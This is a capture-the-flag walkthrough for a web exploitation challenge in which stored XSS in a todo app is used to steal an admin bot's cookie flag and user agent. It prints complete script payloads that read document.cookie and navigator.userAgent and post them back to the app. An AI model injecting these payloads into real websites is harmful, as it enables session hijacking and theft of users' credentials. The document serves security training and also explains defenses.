# Web Application Medium - Todo

> **Category:** Web Application Exploitation
> **Difficulty:** Medium
> **NCL Section:** Gymnasium

---

## 🎯 Objective

A Liber8tion group todo list is vulnerable to Cross-Site Scripting (XSS). The admin user periodically visits the page and has a flag hidden in their cookies. Inject a malicious script to steal their cookies and extract the flag.

> ⚠️ **Scope:** HTTPS only. No automated brute-force tools.

> 🚨 **The flag is dynamically generated.** Every player gets a unique flag in `SKY-XXXX-XXXX` format.

---

## 🔗 Challenge URL

```
https://01a7a4532a27467673665a4368dec6e2-todo.web.cityinthe.cloud/
```

---

## 🛠️ Tools Needed

- **Firefox** (recommended)
- Browser Developer Tools (F12)
- The Todo challenge URL above

> 💡 **Build your web skills:** Before tackling the harder web challenges, we highly recommend working through the **PortSwigger Web Security Academy** (free at [portswigger.net/web-security](https://portswigger.net/web-security)). Their XSS labs are excellent practice and pair perfectly with this challenge. PortSwigger also makes **Burp Suite**, the industry standard tool for web application testing.

---

## 📚 Background: What Is XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page. When other users visit that page, their browser executes the injected script in the context of the website. This means the script runs with access to everything the victim's browser can see, including their cookies.

In this challenge the todo list stores whatever you submit and displays it to every visitor including the admin bot. If you submit a script instead of a todo item, the admin bot's browser will execute it when they visit. That script can then send their cookies back to the server where you can read them.

---

## 📋 Step-by-Step Walkthrough

### Step 1 - Confirm the XSS Vulnerability

Open the challenge URL in a new Firefox window. Type something in the form and submit it. Notice it appears on the page.

Now test if HTML is sanitized by submitting:

```html
<b>Test</b>
```

If the word "Test" appears **bold** on the page, the input is not sanitized and XSS is possible. The server is rendering your HTML directly into the page.

---

### Step 2 - Q1: Name the Vulnerability

You just confirmed it. The vulnerability being exploited is **XSS** (Cross-Site Scripting).

---

### Step 3 - Q2 & Q3: Steal the Admin's Cookies and User Agent

The admin bot periodically visits the page. You need to inject a script that sends their cookies back to the server when they visit.

Submit this exact script into the todo form:

```html
<script>
	fetch('/item', { 
		method : 'POST',
		headers : {
			'Content-Type' : 'application/json',
		},
		body : JSON.stringify({ item : btoa(document.cookie) }),
	}).then(console.log).catch(console.log);
</script>
```

**What this does:**
- Injects a `<script>` tag into the todo list
- When anyone (including the admin bot) visits the page, their browser executes the script
- `document.cookie` grabs their cookies
- `btoa()` base64 encodes the cookie string
- `fetch('/item', ...)` sends it to the server as a new todo item
- It will appear as a new entry in the todo list

After submitting, refresh the page or submit a blank entry to trigger the script. Wait a moment for the admin bot to visit. A new todo item will appear containing base64 encoded text. That's the admin's cookies.

Decode it with CyberChef or in the browser console:

```javascript
atob('paste_base64_here')
```

The decoded text contains the flag in `SKY-XXXX-XXXX` format.

> 💡 **Hint:** The flag in the admin's cookies contains the letters XSS in it. Very on-theme.

---

### Step 4 - Q3: Get the Admin's User Agent

Now do the same thing but grab the User Agent instead of the cookie. Submit this script:

```html
<script>
	fetch('/item', { 
		method : 'POST',
		headers : {
			'Content-Type' : 'application/json',
		},
		body : JSON.stringify({ item : btoa(navigator.userAgent) }),
	}).then(console.log).catch(console.log);
</script>
```

Same process, wait for the admin bot to visit. A new base64 encoded todo item appears. Decode it to get the admin's User Agent string.

> 💡 **Hint:** The admin bot's user agent is not a real browser. It's a custom string that describes exactly what the bot is.

---

### Troubleshooting

- If no new items appear after a minute, the todo list may be full. The system clears the list after 25 entries. Refresh and try again.
- Make sure your script tags are correct. A typo in the JavaScript will silently fail.
- If the base64 decoding gives garbage, check that you copied the full encoded string without any spaces or line breaks.

---

## 💡 Hints (Without Giving It Away)

- **Q1:** You're injecting scripts into a page that other users visit. One very common three-letter abbreviation.
- **Q2:** Submit the cookie-stealing script, wait for the admin bot, decode the base64 output. The flag is inside the cookie string.
- **Q3:** Same as Q2 but use `navigator.userAgent` instead of `document.cookie`. The bot has a very distinctive user agent that reveals exactly what it is.

---

## ⚠️ Accuracy Tips

- ❌ **Don't submit `document.cookie` as plain text.** It has to be inside a `<script>` tag to execute.
- ❌ **Don't forget to decode the base64.** The todo item shows encoded text, not the raw flag.
- ✅ **Wait for the admin bot.** It visits periodically so it may take up to a minute after you inject the script.
- ✅ **Refresh or submit a blank item** to trigger the script on your own browser first to confirm it's working.
- ✅ **Clear the list if it fills up.** The system auto-clears after 25 entries but you can also just wait.

---

## 🧠 Why This Works

Stored XSS (also called Persistent XSS) is particularly dangerous because the malicious script is saved in the application's database and executes for every user who visits the affected page. This is different from Reflected XSS where the script only executes when a victim clicks a specially crafted link. In this challenge the todo list stores your script permanently, meaning the admin bot runs it every time it visits. Cookie theft via XSS is one of the most impactful uses of the vulnerability because it allows full session hijacking. Real applications defend against this with Content Security Policy headers, input sanitization, and the `HttpOnly` cookie flag which prevents JavaScript from accessing sensitive cookies entirely.

---

## 🔗 Resources

- [NCL XSS Tutorial Video](https://www.youtube.com/watch?v=KnEG80uys8E)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [btoa() and atob() - MDN](https://developer.mozilla.org/en-US/docs/Web/API/btoa)

---

*Written by: Mo | Last updated: March 2026*
